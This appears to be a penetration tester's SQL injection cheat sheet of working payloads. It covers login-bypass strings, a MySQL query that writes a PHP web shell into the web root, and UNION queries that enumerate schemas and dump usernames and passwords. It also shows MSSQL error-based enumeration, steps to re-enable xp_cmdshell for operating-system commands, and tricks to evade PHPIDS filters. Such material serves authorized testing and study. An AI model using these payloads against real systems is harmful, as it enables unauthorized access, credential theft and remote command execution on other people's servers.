# SQL injection 

## Login Bypass:   << replace ' with " if fail
  ' or '1'='1  
  ' or 1=1;--  
  ' or 1=1;#  
  ') or ('x'='x  
  ' or <column> like '%';--  
  ' or 1=1 LIMIT 1;--  

  USERNAME:   ' or 1/*  
  PASSWORD:   */ =1 --  

  USERNAME: admin' or 'a'='a  
  PASSWORD '#  

If the database is mysql, try to dump all login info to files?

Mysql
  '*'   
  '&'  
  '^'  
  '-'  
  ' or true;--   
  ' or 1;--  

union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'

## Enumeration
1. Confirm number of columns
order by 1 -- 100

2. union select
union select 1,2,3,4,5,6,7 to find which column will display info

3. Find databse name, user name, and version.  << must use group_concat for one liner
(select group_concat(database(),0x3a,user(),0x3a,version()))

4. Find table name
table_name                                      from information_schema.tables where table_schema=database()
(select group_concat(table_name) from information_schema.tables where table_schema=database())

5. Find columns 
column_name                                 from information_schema.columns where table_name='<Table_Name>'
column_name                                 from information_schema.columns where table_name=<HEX>
column_name                                 from information_schema.columns where table_name like <HEX>
(select group_concat(column_name) from information_schema.columns where table_name='dev_accounts')
(select group_concat(column_name) from information_schema.columns where table_name=0x6465765f6163636f756e7473)   << possible that some character are filtered out

6. Dump data
(select group_concat(id, 0x3A, username, 0x3A, password) from dev_accounts)

7. One liner to output all corresponding databse with table and columns
(select group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns)
(select group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database())

	concat(table_schema,0x3a,table_name,0x3a,column_name)               from information_schema.columns where table_schema=database()

### MSSQL Enumeration: Error based - https://www.exploit-db.com/papers/12975/

	Enumerate column and table name
	http://www.example.com/page.asp?id=1' HAVING 1=1--
	Error message: Column 'news.news_id' is invalid                 < table_name.column

	http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
	Error message: Column 'news.news_author' is invalid           < table_name.column2

	http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
	Error message: Column 'news.news_detail' is invalid             < table_name.column3

	Until no error

	Enumerate version, db name, users:
	http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
	http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
	http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       << Is the user running as dbo or sa?

	xp_cmdshell << if running as database admin
	http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
	'; exec master.dbo.xp_cmdshell 'command'



	On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:
	EXEC sp_configure 'show advanced options', 1;--
	RECONFIGURE;-- 
	EXEC sp_configure 'xp_cmdshell', 1;-- 
	RECONFIGURE;--  

	On MSSQL 2000:
	EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--


## SQL filter bypass
Beyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/

	AND, OR operators
	AND = &&
	OR = ||

	Comment operator << Mysql
	--  	
	#  
	/**/  

	Regular expression
	It is common that PHPIDS will block operators such as =, ', (), 
	table_name = 'users' X
	table_name between 'a' and 'z' X
	table_name between char(97) and char(122) X

	Convert strings to HEX format.
	table_name between 0x61 and 0x7a
	table_name like 0x7573657273

	Change case
	union > UniOn
	select > SeLect

	Inline comments << Mysql 5.0
	/*! <sql operator> */
